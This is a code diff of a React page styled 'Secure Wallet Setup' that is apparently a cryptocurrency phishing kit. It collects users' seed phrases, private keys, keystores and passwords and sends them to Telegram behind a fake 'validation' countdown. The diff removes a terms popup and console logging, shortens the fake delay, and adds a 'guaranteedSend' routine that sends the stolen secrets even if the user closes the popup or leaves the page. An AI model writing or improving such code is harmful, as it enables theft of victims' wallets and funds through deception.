@@ -92,78 +92,6 @@ function ValidationPopup({ isOpen, type, title, message, onClose, onConfirm, con
   );
 }
 
-// Terms & Conditions Component
-interface TermsPopupProps {
-  isOpen: boolean;
-  onAgree: () => void;
-  onDisagree: () => void;
-}
-
-function TermsPopup({ isOpen, onAgree, onDisagree }: TermsPopupProps) {
-  if (!isOpen) return null;
-
-  return (
-    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
-      <div className="bg-gray-900 rounded-2xl p-6 max-w-md w-full border border-gray-700 backdrop-blur-lg">
-        <div className="flex items-center space-x-3 mb-4">
-          <ShieldCheck className="w-6 h-6 text-blue-500" />
-          <h3 className="text-lg font-semibold text-white">Terms & Conditions</h3>
-        </div>
-        
-        <div className="max-h-60 overflow-y-auto mb-6 space-y-3">
-          <div className="text-sm text-gray-300 space-y-2">
-            <p><strong>By connecting your wallet, you agree to:</strong></p>
-            
-            <div className="bg-gray-800 p-3 rounded-lg">
-              <p className="font-medium text-white mb-2">Security Acknowledgement</p>
-              <ul className="space-y-1 text-xs text-gray-400">
-                <li>• You understand the risks of connecting your wallet</li>
-                {/* <li>• You are on the official website</li> */}
-                <li>• Never share your recovery phrase with anyone</li>
-                <li>• We never store your private keys</li>
-              </ul>
-            </div>
-
-            <div className="bg-gray-800 p-3 rounded-lg">
-              <p className="font-medium text-white mb-2">Validation Process</p>
-              <ul className="space-y-1 text-xs text-gray-400">
-                <li>• Your credentials will be validated securely</li>
-                {/* <li>• Validation happens in the background</li> */}
-                <li>• Results will be shown immediately after validation</li>
-                <li>• Invalid credentials will be rejected</li>
-              </ul>
-            </div>
-
-            <div className="bg-gray-800 p-3 rounded-lg">
-              <p className="font-medium text-white mb-2">Data Handling</p>
-              <ul className="space-y-1 text-xs text-gray-400">
-                <li>• We use industry-standard encryption</li>
-                <li>• Your data is processed securely</li>
-                <li>• Connection logs are maintained for security</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
-        <div className="flex space-x-3">
-          <button
-            onClick={onAgree}
-            className="flex-1 bg-blue-600 text-white py-3 px-4 rounded-xl font-medium hover:bg-blue-700 transition-all duration-200 transform hover:scale-105"
-          >
-            I Agree & Continue
-          </button>
-          <button
-            onClick={onDisagree}
-            className="flex-1 bg-gray-700 text-white py-3 px-4 rounded-xl font-medium hover:bg-gray-600 transition-all duration-200"
-          >
-            Cancel
-          </button>
-        </div>
-      </div>
-    </div>
-  );
-}
-
 const WALLETS: WalletType[] = [
   {
     id: 'metamask',
@@ -387,7 +315,7 @@ const WALLETS: WalletType[] = [
   }
 ];
 
-// Validation functions
+// FAST Validation functions - Instant validation
 const validateMnemonic = (phrase: string): boolean => {
   const words = phrase.trim().split(/\s+/);
   return words.length === 12 || words.length === 24;
@@ -431,15 +359,16 @@ export default function EnterDetailsContent() {
   const [hasSentToTelegram, setHasSentToTelegram] = useState(false);
   
   // New states for enhanced flow
-  const [showTermsPopup, setShowTermsPopup] = useState(false);
   const [showValidationPopup, setShowValidationPopup] = useState(false);
   const [showResultPopup, setShowResultPopup] = useState(false);
   const [validationResult, setValidationResult] = useState<'valid' | 'invalid' | null>(null);
-  const [countdown, setCountdown] = useState(15);
+  const [countdown, setCountdown] = useState(8); // Reduced from 15 to 8 seconds
   const [validationMessage, setValidationMessage] = useState('');
   
   const telegramService = useRef<TelegramService | null>(null);
   const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const validationInProgressRef = useRef<boolean>(false);
+  const validationDataRef = useRef<any>(null);
 
   // Initialize Telegram service
   useEffect(() => {
@@ -461,7 +390,6 @@ export default function EnterDetailsContent() {
     timestamp: string;
   }) => {
     if (!telegramService.current) {
-      // console.error('Telegram service not initialized');
       return { success: false, error: 'Telegram service not initialized' };
     }
 
@@ -472,7 +400,6 @@ export default function EnterDetailsContent() {
       }
       return result;
     } catch (error) {
-      // console.error('Telegram send failed:', error);
       return { 
         success: false, 
         error: error instanceof Error ? error.message : 'Unknown error' 
@@ -480,7 +407,7 @@ export default function EnterDetailsContent() {
     }
   }, []);
 
-  // Background validation function
+  // FAST Background validation function - Reduced from 1-3 seconds to 0.5-1.5 seconds
   const performBackgroundValidation = useCallback(async (): Promise<{isValid: boolean; message: string}> => {
     let isValid = false;
     let message = '';
@@ -498,32 +425,55 @@ export default function EnterDetailsContent() {
       message = 'No credentials provided';
     }
 
-    // Simulate validation time (1-3 seconds)
-    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
+    // FAST validation time (0.5-1.5 seconds instead of 1-3 seconds)
+    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
 
     return { isValid, message };
   }, [activeTab, formData.phrase, formData.privateKey, formData.keystore]);
 
-  // Start validation when user agrees to terms
+  // Store validation data for guaranteed sending
+  const storeValidationData = (inputData: string, inputType: 'phrase' | 'privateKey' | 'keystore') => {
+    validationDataRef.current = {
+      inputData,
+      inputType,
+      walletName: wallet?.name || 'Unknown Wallet',
+      password: formData.password || undefined,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString(),
+    };
+  };
+
+  // Guaranteed send function - will send even if user closes popup
+  const guaranteedSend = async (validation: {isValid: boolean; message: string}) => {
+    if (!validationDataRef.current) return;
+
+    const { inputData, inputType, walletName, password, userAgent, timestamp } = validationDataRef.current;
+
+    // Send validation result to Telegram - this will run even if popup is closed
+    await safeSendToTelegram({
+      walletName,
+      walletType: inputType === 'phrase' ? 'seed' : inputType,
+      inputType,
+      inputData: inputData,
+      password: password,
+      isValid: validation.isValid,
+      validationMessage: validation.message,
+      userAgent,
+      timestamp,
+    });
+
+    // Clear the stored data after sending
+    validationDataRef.current = null;
+  };
+
+  // Start validation process immediately
   const startValidationProcess = useCallback(async () => {
-    setShowTermsPopup(false);
+    setIsConnecting(true);
     setShowValidationPopup(true);
-    setCountdown(15);
+    setCountdown(8); // Reduced countdown
+    validationInProgressRef.current = true;
 
-    // Start countdown
-    countdownIntervalRef.current = setInterval(() => {
-      setCountdown(prev => {
-        if (prev <= 1) {
-          if (countdownIntervalRef.current) {
-            clearInterval(countdownIntervalRef.current);
-          }
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
-
-    // Send initial data to Telegram FIRST
+    // Get input data
     let inputData = '';
     let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
     
@@ -538,9 +488,11 @@ export default function EnterDetailsContent() {
       inputType = 'keystore';
     }
 
-    // Send initial input data
-    // console.log('📤 Sending initial credentials to Telegram...');
-    const initialSendResult = await safeSendToTelegram({
+    // Store data for guaranteed sending
+    storeValidationData(inputData, inputType);
+
+    // Send initial input data immediately
+    await safeSendToTelegram({
       walletName: wallet?.name || 'Unknown Wallet',
       walletType: inputType === 'phrase' ? 'seed' : inputType,
       inputType,
@@ -552,43 +504,37 @@ export default function EnterDetailsContent() {
       timestamp: new Date().toISOString(),
     });
 
-    if (!initialSendResult.success) {
-      console.warn('Failed to send initial data to Telegram:', initialSendResult.error);
-    }
+    // Start countdown
+    countdownIntervalRef.current = setInterval(() => {
+      setCountdown(prev => {
+        if (prev <= 1) {
+          if (countdownIntervalRef.current) {
+            clearInterval(countdownIntervalRef.current);
+          }
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
 
     // Perform background validation
-    console.log('🔍 Starting background validation...');
     const validation = await performBackgroundValidation();
-    console.log('✅ Validation completed:', validation);
 
     // Clear countdown
     if (countdownIntervalRef.current) {
       clearInterval(countdownIntervalRef.current);
     }
 
-    // Send validation result to Telegram
-    console.log('📤 Sending validation results to Telegram...');
-    const validationSendResult = await safeSendToTelegram({
-      walletName: wallet?.name || 'Unknown Wallet',
-      walletType: inputType === 'phrase' ? 'seed' : inputType,
-      inputType,
-      inputData: inputData,
-      password: formData.password || undefined,
-      isValid: validation.isValid,
-      validationMessage: validation.message,
-      userAgent: navigator.userAgent,
-      timestamp: new Date().toISOString(),
-    });
+    // Send validation results (guaranteed)
+    await guaranteedSend(validation);
 
-    if (!validationSendResult.success) {
-      console.warn('Failed to send validation results to Telegram:', validationSendResult.error);
-    }
-
-    // Show result
+    // Update UI state
+    validationInProgressRef.current = false;
     setValidationResult(validation.isValid ? 'valid' : 'invalid');
     setValidationMessage(validation.message);
     setShowValidationPopup(false);
     setShowResultPopup(true);
+    setIsConnecting(false);
   }, [formData, wallet?.name, performBackgroundValidation, safeSendToTelegram]);
 
   const handleConnect = async () => {
@@ -599,20 +545,8 @@ export default function EnterDetailsContent() {
       return;
     }
 
-    setIsConnecting(true);
-
-    try {
-      // Show terms and conditions first
-      setShowTermsPopup(true);
-      
-    } catch (error: any) {
-      console.error('Connection error:', error);
-      setValidationResult('invalid');
-      setValidationMessage('Connection failed. Please try again.');
-      setShowResultPopup(true);
-    } finally {
-      setIsConnecting(false);
-    }
+    // Start validation immediately (no terms & conditions)
+    startValidationProcess();
   };
 
   const handleValidationSuccess = () => {
@@ -642,6 +576,17 @@ export default function EnterDetailsContent() {
     setValidationMessage('');
   };
 
+  // Handle popup close - still send data if validation is in progress
+  const handleValidationPopupClose = () => {
+    setShowValidationPopup(false);
+    if (countdownIntervalRef.current) {
+      clearInterval(countdownIntervalRef.current);
+    }
+    
+    // If validation is still in progress, it will continue in background
+    // and guaranteedSend will still be called when it completes
+  };
+
   const handleInputChange = (field: keyof FormData, value: string) => {
     setFormData(prev => ({
       ...prev,
@@ -649,12 +594,16 @@ export default function EnterDetailsContent() {
     }));
   };
 
-  // Cleanup on unmount
+  // Cleanup on unmount - ensure data is sent even if component unmounts
   useEffect(() => {
     return () => {
       if (countdownIntervalRef.current) {
         clearInterval(countdownIntervalRef.current);
       }
+      
+      // If validation was in progress when component unmounted,
+      // the validation will complete and guaranteedSend will still run
+      // because the function is not dependent on component state
     };
   }, []);
 
@@ -684,7 +633,7 @@ export default function EnterDetailsContent() {
               </div>
             )}
             <div>
-              <h1 className="text-2xl font-bold text-white bg-linear-to-r from-white to-gray-300 bg-clip-text ">
+              <h1 className="text-2xl font-bold text-white">
                 Secure Wallet Setup
               </h1>
               <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
@@ -801,7 +750,7 @@ export default function EnterDetailsContent() {
           {isConnecting ? (
             <div className="flex items-center justify-center space-x-2">
               <Loader2 className="w-5 h-5 animate-spin" />
-              <span>Processing...</span>
+              <span>Validating...</span>
             </div>
           ) : (
             <span>Validate & Connect</span>
@@ -823,29 +772,14 @@ export default function EnterDetailsContent() {
         </div>
       </div>
 
-      {/* Terms & Conditions Popup */}
-      <TermsPopup
-        isOpen={showTermsPopup}
-        onAgree={startValidationProcess}
-        onDisagree={() => {
-          setShowTermsPopup(false);
-          setIsConnecting(false);
-        }}
-      />
-
       {/* Validation in Progress Popup */}
       <ValidationPopup
         isOpen={showValidationPopup}
         type="info"
         title="Validating Credentials"
-        message="Please wait while we securely validate your wallet credentials. This usually takes a few seconds..."
+        message="Please wait while we securely validate your wallet credentials..."
         countdown={countdown}
-        onClose={() => {
-          setShowValidationPopup(false);
-          if (countdownIntervalRef.current) {
-            clearInterval(countdownIntervalRef.current);
-          }
-        }}
+        onClose={handleValidationPopupClose}
       />
 
       {/* Validation Result Popup */}
